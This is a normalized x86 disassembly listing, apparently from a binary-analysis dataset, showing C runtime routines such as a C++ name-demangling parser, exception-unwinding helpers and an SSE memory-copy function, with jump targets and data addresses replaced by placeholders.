mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_410f29
lea ecx [ ebp - 0xc ]
call sub_413d21
cmp al 0x3e
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x3e
lea ecx [ ebp - 0xc ]
call sub_410f6c
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x20
lea ecx [ ebp - 0xc ]
call sub_410f6c
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
inc eax
mov [ rw-data ] eax
sub_415921
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x8 ] 0x0
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
and [ ebp - 0x10 ] 0x0
push 0x1
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_4129a9
mov eax [ ebp + 0x8 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_41595b
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x18
mov cl [ eax ]
test cl cl
je r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x1
push eax
push r--data
lea ecx [ ebp - 0x10 ]
call sub_410873
mov ecx eax
call sub_410f07
mov ecx eax
cmp cl 0x5a
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_412170
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_410873
mov ecx eax
call sub_410e7f
push 0x29
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
inc eax
mov [ rw-data ] eax
and ecx 0xffff0000
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] ecx
jmp r-xdata
call sub_410ea1
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4159e5
push ebp
mov ebp esp
push ecx
mov edx [ rw-data ]
push ebx
push esi
push edi
mov esi 0x4000
mov al [ edx ]
cmp al 0x41
jl r-xdata
inc edx
mov ecx esi
mov [ rw-data ] edx
cmp al 0x24
jne r-xdata
cmp al 0x5a
jle r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
inc edx
mov [ ebp - 0x1 ] 0x0
mov [ rw-data ] edx
movsx eax [ edx ]
cmp eax 0x42
jg r-xdata
movsx ebx [ edx ]
mov eax 0x8000
sub ebx 0x41
or ecx eax
inc edx
mov [ rw-data ] edx
test bl 0x1
je r-xdata
cmp al 0x39
jne r-xdata
cmp al 0x38
jg r-xdata
sub eax 0x43
je r-xdata
je r-xdata
and ecx 0xffffdfff
or ecx 0x2000
jmp r-xdata
xor ecx ecx
test al al
setne cl
add ecx 0xfffe
inc edx
mov ecx 0xfffd
mov [ rw-data ] edx
jmp r-xdata
movsx eax al
inc edx
add eax 0xffffffd0
mov [ rw-data ] edx
and ecx 0xffff7fff
cmp eax 0x8
ja r-xdata
or ecx 0x7c00
sub eax 0x1
je r-xdata
or ecx 0x9800
jmp r-xdata
test eax eax
je r-xdata
mov eax ecx
mov esi 0xffffefff
mov edi 0x800
test eax ecx
je r-xdata
cmp ebx 0x18
jge r-xdata
mov eax 0xffff
jmp r-xdata
jmp [ eax * 4 + jump_table_415ec1 ]
and ecx 0xfffff5ff
or ecx 0x9100
jmp r-xdata
sub eax 0x1
je r-xdata
inc edx
mov [ rw-data ] edx
jmp r-xdata
mov ecx 0xfffe
dec edx
jmp r-xdata
cmp eax 0x24
jne r-xdata
and ecx 0xffff9fff
and ecx esi
or ecx edi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x8000
test eax ecx
je r-xdata
mov eax 0x8000
test eax ecx
je r-xdata
mov eax 0x8000
test eax ecx
je r-xdata
and ecx 0xffffdfff
or ecx esi
jmp r-xdata
and ecx 0xffffe3ff
or ecx 0x6000
jmp r-xdata
and ecx 0xffffbfff
or ecx 0x2000
jmp r-xdata
and ecx 0xffffebff
or ecx 0x6800
jmp r-xdata
and ecx 0xfffff3ff
or ecx 0x7000
jmp r-xdata
and ecx 0xfffffbff
or ecx 0x7800
jmp r-xdata
and ecx 0xfffff6ff
or ecx 0x9200
jmp r-xdata
sub eax 0xd
jne r-xdata
cmp eax 0x2f
jle r-xdata
cmp [ edx + 0x1 ] 0x50
jne r-xdata
test eax ecx
je r-xdata
cmp edx 0x8
je r-xdata
mov edx ebx
and edx 0x18
je r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
inc edx
mov [ ebp - 0x1 ] 0x1
mov [ rw-data ] edx
mov bl [ edx ]
cmp bl 0x30
jl r-xdata
cmp eax 0x35
jle r-xdata
inc edx
mov [ rw-data ] edx
movsx eax [ edx ]
cmp eax 0x4a
jg r-xdata
inc edx
and ecx esi
or ecx edi
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
cmp edx 0x10
je r-xdata
and ecx 0xffffefff
or ecx 0x800
jmp r-xdata
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
test eax ecx
je r-xdata
xor eax eax
test bl bl
sete al
add eax 0xfffe
jmp r-xdata
cmp bl 0x35
jg r-xdata
movsx ebx [ edx ]
mov eax 0x8000
or ecx eax
sub ebx 0x30
mov esi 0xffffefff
mov edi 0x800
test eax ecx
je r-xdata
cmp eax 0x41
jne r-xdata
cmp eax 0x4c
jl r-xdata
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ebx 0x6
sub ebx 0x0
je r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffff9fff
and ecx esi
or ecx edi
jmp r-xdata
and ecx 0xfffff4ff
or ecx 0x9000
jmp r-xdata
cmp eax 0x4d
jle r-xdata
inc edx
mov [ rw-data ] edx
mov al [ edx ]
cmp al 0x30
jl r-xdata
sub eax 0x0
je r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
and ecx 0xfffffdff
or ecx 0x500
and ecx 0xfffffeff
or ecx 0x600
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
inc edx
mov [ rw-data ] edx
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov ecx 0xffff
jmp r-xdata
cmp al 0x39
jg r-xdata
mov eax 0xfffe
jmp r-xdata
sub eax 0x46
je r-xdata
and ecx 0xffff9fff
jmp r-xdata
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xfffff9ff
or ecx 0x100
jmp r-xdata
dec ebx
sub ebx 0x1
jne r-xdata
and ecx 0xffffdfff
or ecx 0x2000
jmp r-xdata
test bl 0x1
je r-xdata
xor ecx ecx
cmp [ edx ] 0x5f
jne r-xdata
cmp eax 0x51
movsx eax al
add eax 0xffffffd1
add eax edx
mov [ rw-data ] eax
call sub_4159e5
or eax 0x10000
jmp r-xdata
dec eax
sub eax 0x1
jmp r-xdata
and ecx 0xfffffcff
or ecx 0x400
jmp r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ebx 0x6
sub ebx 0x0
je r-xdata
jne r-xdata
and ecx esi
or ecx edi
jmp r-xdata
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
jne r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
sub_415ee5
push ebp
mov ebp esp
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
cmp cl 0x41
mov ecx [ ebp + 0x8 ]
je r-xdata
inc eax
push r--data
mov [ rw-data ] eax
call sub_410873
jmp r-xdata
push 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
call sub_4108ad
sub_415f35
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push r--data
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_411021
lea eax [ ebp - 0x8 ]
push eax
call sub_414a47
pop ecx
push eax
mov ecx esi
call sub_410f29
push 0x7d
mov ecx esi
call sub_410f6c
mov ecx [ rw-data ]
cmp [ ecx ] 0x40
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
inc ecx
mov [ rw-data ] ecx
sub_415f8b
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
sub esp 0x20
mov eax [ ecx ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
inc ebx
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov cl al
mov [ esi + 0x4 ] eax
cmp cl bl
jg r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp cl bl
jg r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_412fcb
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
push 0x20
mov [ ebp - 0x4 ] eax
call sub_410f6c
push esi
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e7f
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
lea ecx [ ebp - 0x20 ]
call sub_4108ad
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x10 ]
mov [ esi ] ecx
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
cmp [ eax ] 0x40
je r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
push r--data
cmp [ eax ] 0x40
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
cmp cl 0x40
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_414a47
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x60
lea ecx [ ebp - 0x20 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x27
mov [ ebp - 0x4 ] eax
call sub_410f6c
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_410f29
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
push 0x7d
mov ecx esi
call sub_410f6c
mov eax [ rw-data ]
push ebx
mov ecx esi
call sub_411082
cmp [ esi + 0x4 ] bl
jg r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] 0x40
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
push r--data
jmp r-xdata
mov ecx esi
call sub_411021
mov eax [ rw-data ]
sub_4160f0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov bl [ esi ]
movsx eax bl
sub eax 0x30
cmp eax 0x9
ja r-xdata
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0xffff0000
cmp bl 0x3f
jne r-xdata
mov ecx [ rw-data ]
inc esi
push eax
push edi
mov [ rw-data ] esi
call sub_410c5c
jmp r-xdata
mov eax r--data
push 0x13
push eax
push esi
mov [ ebp - 0x20 ] eax
call sub_416536
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push eax
call sub_4157cb
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x18 ] eax
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax r--data
push 0xd
push eax
push esi
mov [ ebp - 0x20 ] eax
call sub_416536
add esp 0xc
test eax eax
jne r-xdata
add esi 0x13
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
dec ecx
xor eax eax
mov [ rw-data ] ecx
cmp [ ecx ] al
lea ecx [ ebp - 0x1c ]
setne al
inc eax
push eax
call sub_410c27
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add esi 0xd
lea eax [ ebp - 0x2c ]
mov [ rw-data ] esi
push eax
call sub_414f20
test [ rw-data ] 0x4000
pop ecx
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ edi ] eax
mov eax [ ebp - 0x18 ]
mov [ edi + 0x4 ] eax
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
push 0x40
push rw-data
lea ecx [ ebp - 0x3c ]
call sub_41072b
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
cmp bl 0x40
jne r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_410bf5
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x3c ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x30 ]
push r--data
mov [ ebp - 0x28 ] eax
call sub_411021
lea eax [ ebp - 0x2c ]
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_4110c2
mov eax [ ebp - 0x38 ]
and [ ebp - 0x1c ] 0x0
and eax 0xffff0000
inc esi
mov [ rw-data ] esi
jmp r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_414fb0
lea eax [ ebp - 0x14 ]
push eax
call sub_42efe6
mov esi [ rw-data ]
pop ecx
push eax
mov ecx esi
call j_sub_40d4a2
call esi
pop ecx
lea ecx [ ebp - 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x18 ] eax
push r--data
call sub_410bf5
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x3c ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x30 ]
push r--data
mov [ ebp - 0x20 ] eax
call sub_411021
lea eax [ ebp - 0x24 ]
jmp r-xdata
push eax
call sub_410bf5
jmp r-xdata
push eax
lea ecx [ ebp - 0x1c ]
call sub_410f29
jmp r-xdata
sub_4163b4
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
mov esi [ eax ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
pop esi
pop edi
retn
xor eax eax
pop edi
retn
sub_4163e8
push ebp
mov ebp esp
push ecx
mov eax ecx
mov [ ebp - 0x4 ] eax
cmp [ eax + 0xc ] 0x0
jge r-xdata
mov eax [ eax + 0xc ]
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ eax + 0x4 ]
push esi
push edi
mov edi [ eax + 0x8 ]
mov eax [ edi ]
mov esi [ eax ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
mov edx [ ebx ]
mov edi eax
mov esi [ edx ]
mov ecx esi
call j_sub_40d4a2
mov ecx ebx
call esi
add edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
pop edi
pop esi
pop ebx
sub_416436
push ebp
mov ebp esp
mov eax [ rw-data ]
test al 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3
ja r-xdata
xor ecx ecx
mov [ rw-data ] 0x4
inc ecx
mov [ rw-data ] 0x2
or eax ecx
mov [ rw-data ] ecx
xor edx edx
mov [ rw-data ] eax
mov eax r--data
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] 0x3
mov [ rw-data ] edx
mov eax rw-data
pop ebp
retn
imul eax eax 0xc
add eax rw-data
pop ebp
retn
sub_416500
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
sub esi ecx
mov al [ esi + ecx ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop esi
sub_416536
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ebx
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop ebx
pop ebp
retn
mov bl [ edx ]
test bl bl
je r-xdata
cmp bl [ ecx ]
jne r-xdata
inc edx
inc ecx
jmp r-xdata
sub eax 0x1
je r-xdata
sub_416567
push 0x64
push r--data
call sub_40d270
mov edi [ ebp + 0x14 ]
test edi edi
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push esi
call sub_41067a
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
movzx eax [ ebp + 0x1c ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_410a37
lea ecx [ ebp - 0x74 ]
call sub_410c98
mov edi eax
mov [ ebp - 0x1c ] edi
mov ecx rw-data
call sub_411145
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4165f4
mov eax edi
xor eax eax
jmp r-xdata
call sub_40d2b6
retn
sub_4165fc
push 0x64
push r--data
call sub_40d270
mov edi [ ebp + 0x14 ]
test edi edi
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push esi
call sub_41067a
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_410a37
lea ecx [ ebp - 0x74 ]
call sub_410c98
mov edi eax
mov [ ebp - 0x1c ] edi
mov ecx rw-data
call sub_411145
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416689
mov eax edi
xor eax eax
jmp r-xdata
call sub_40d2b6
retn
sub_416691
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_42913c
add esp 0x1c
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_4166c0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4166e0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40c38e
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_416725
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_416725
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4166e0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4167d5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4167f4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4167cc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4167d5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_416860
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
